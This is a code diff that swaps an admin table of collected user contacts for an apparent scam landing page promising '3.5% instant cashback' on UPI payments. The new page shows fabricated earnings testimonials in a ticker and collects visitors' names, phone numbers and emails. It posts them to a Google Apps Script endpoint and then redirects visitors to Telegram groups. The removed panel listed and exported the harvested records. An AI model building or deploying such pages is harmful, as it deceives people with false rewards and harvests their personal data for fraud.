@@ -3,74 +3,105 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Admin Panel</title>
+    <title>AJAY UPI | 3.5% Instant Cashback</title>
     <script src="https://cdn.tailwindcss.com"></script>
-    <script src="https://cdn.jsdelivr.net/npm/xlsx@0.18.5/dist/xlsx.full.min.js"></script>
+    <link href="https://cdn.jsdelivr.net/npm/font-awesome@4.7.0/css/font-awesome.min.css" rel="stylesheet">
+    <script>
+        tailwind.config = {
+            theme: { extend: {
+                colors: { primary: '#36D399', darkBg: '#111827', darkCard: '#1F2937' }
+            }}
+        }
+    </script>
     <style>
-        body { background: #111827; color: white; }
+        * { scroll-behavior: smooth; margin:0; padding:0; box-sizing:border-box; }
+        body { background:#111827; color:#fff; }
+        .overlay-dark { background:rgba(0,0,0,0.75); }
+        .activity-card { background:#1F2937; border-radius:16px; padding:24px; margin-bottom:16px; }
+        .highlight { color:#36D399; font-weight:600; }
+        .main-btn { background:#36D399; color:#000; font-weight:bold; border-radius:999px; padding:12px 24px; }
+        .top-marquee { position:fixed; top:0; left:0; right:0; color:white; padding:6px 0; overflow:hidden; white-space:nowrap; z-index:9999; font-size:14px; }
+        .marquee-wrap { display:inline-block; animation:marquee 25s linear infinite; }
+        .marquee-item { display:inline-block; margin-right:50px; }
+        @keyframes marquee { 0%{transform:translateX(100%)} 100%{transform:translateX(-100%)} }
+        video { object-fit:cover; }
+        .modal-overlay { display:none; position:fixed; top:0; left:0; width:100%; height:100%; background:rgba(0,0,0,0.8); z-index:9999; align-items:center; justify-content:center; }
+        .modal-card { background:#1F2937; border-radius:16px; padding:32px; width:90%; max-width:420px; text-align:center; }
     </style>
 </head>
-<body class="p-6">
-    <div class="max-w-6xl mx-auto">
-        <h1 class="text-3xl font-bold text-[#36D399] mb-6">👑 Admin Panel</h1>
+<body>
 
-        <div class="bg-[#1F2937] rounded-xl p-6 shadow-lg mb-6 flex gap-4">
-            <button onclick="refreshData()" class="bg-blue-500 px-6 py-2 rounded">🔄 Refresh Data</button>
-            <button onclick="exportExcel()" class="bg-green-500 px-6 py-2 rounded">📊 Export Excel</button>
-        </div>
+<div class="top-marquee">
+    <div class="marquee-wrap">
+        <span class="marquee-item">✅ User Arjun earned ₹15,600</span>
+        <span class="marquee-item">✅ User Priya earned ₹89,200</span>
+        <span class="marquee-item">✅ User Raj earned ₹45,800</span>
+    </div>
+</div>
 
-        <div class="bg-[#1F2937] rounded-xl p-6 shadow-lg">
-            <table class="w-full text-left">
-                <thead>
-                    <tr class="border-b border-gray-700">
-                        <th class="py-3 text-[#36D399]">#</th>
-                        <th class="py-3 text-[#36D399]">Name</th>
-                        <th class="py-3 text-[#36D399]">Phone</th>
-                        <th class="py-3 text-[#36D399]">Email</th>
-                        <th class="py-3 text-[#36D399]">Time</th>
-                    </tr>
-                </thead>
-                <tbody id="tableBody"></tbody>
-            </table>
+<section class="relative w-full h-screen flex items-center justify-center overflow-hidden mt-[32px]">
+    <video autoplay muted loop class="absolute w-full h-full object-cover z-0">
+        <source src="background.mp4" type="video/mp4">
+    </video>
+    <div class="absolute w-full h-full overlay-dark z-10"></div>
+    <div class="relative z-20 text-center px-6 max-w-5xl">
+        <h1 class="text-4xl font-bold text-white mb-6">
+            <span class="text-primary">3.5% INSTANT CASHBACK</span><br>AJAY UPI REWARD
+        </h1>
+        <a href="#form" class="main-btn inline-block text-xl">ACTIVATE NOW</a>
+    </div>
+</section>
+
+<section id="form" class="py-20 px-4">
+    <div class="max-w-4xl mx-auto">
+        <div class="bg-darkCard rounded-2xl p-10 border border-gray-700">
+            <h2 class="text-center text-2xl font-bold text-primary mb-6">APPLY NOW</h2>
+            <form id="cashbackForm" class="space-y-4">
+                <input name="name" placeholder="Full Name" class="w-full bg-gray-800 rounded-lg px-4 py-3 text-white" required>
+                <input name="phone" placeholder="Mobile Number" class="w-full bg-gray-800 rounded-lg px-4 py-3 text-white" required>
+                <input name="email" placeholder="Email" class="w-full bg-gray-800 rounded-lg px-4 py-3 text-white" required>
+                <button type="submit" class="main-btn w-full text-lg py-3">SUBMIT</button>
+            </form>
         </div>
     </div>
+</section>
+
+<div class="modal-overlay" id="confirmModal">
+    <div class="modal-card">
+        <h2 class="text-xl font-bold text-primary mb-4">Join Group</h2>
+        <button onclick="confirmJoin()" class="main-btn w-full">Confirm Join</button>
+    </div>
+</div>
 
 <script>
-let users = [];
+const telegramGroups = ["https://t.me/yourgroup1","https://t.me/yourgroup2"];
+let selectedGroup = "";
 
-async function refreshData() {
+document.getElementById("cashbackForm").addEventListener("submit", async function(e){
+    e.preventDefault();
+    const data = {
+        name: this.name.value,
+        phone: this.phone.value,
+        email: this.email.value,
+        time: new Date().toLocaleString()
+    };
+
     try {
-        let res = await fetch("https://script.googleusercontent.com/macros/echo?user_content_key=R0HYk1Ys7oS2H0N1H0N1H0N1H0N1H0N1H0N1H0N1H0N1H0N1&lib=MRpDQ0-864646464646464646");
-        users = await res.json();
-        renderTable();
-    } catch (e) {
-        alert("刷新失败");
-    }
-}
+        await fetch("https://script.google.com/macros/s/AKfycbyNvxPfCOz4z0Fg5wH8wN0H0N1H0N1H0N1H0N1H0N1/exec", {
+            method: "POST",
+            body: new URLSearchParams(data)
+        });
+    } catch(e){}
 
-function renderTable() {
-    let html = "";
-    users.forEach((item, i) => {
-        html += `
-        <tr class="border-b border-gray-800">
-            <td class="py-3">${i+1}</td>
-            <td class="py-3">${item.name}</td>
-            <td class="py-3 font-bold text-[#36D399]">${item.phone}</td>
-            <td class="py-3">${item.email}</td>
-            <td class="py-3 text-gray-400 text-sm">${item.time}</td>
-        </tr>`;
-    });
-    document.getElementById("tableBody").innerHTML = html;
-}
+    selectedGroup = telegramGroups[Math.floor(Math.random()*telegramGroups.length)];
+    document.getElementById("confirmModal").style.display = "flex";
+    this.reset();
+});
 
-function exportExcel() {
-    const wb = XLSX.utils.book_new();
-    const ws = XLSX.utils.json_to_sheet(users);
-    XLSX.utils.book_append_sheet(wb, ws, "Users");
-    XLSX.writeFile(wb, "UserList.xlsx");
+function confirmJoin(){
+    window.open(selectedGroup, "_blank");
+    document.getElementById("confirmModal").style.display = "none";
 }
-
-refreshData();
 </script>
 </body>
 </html>
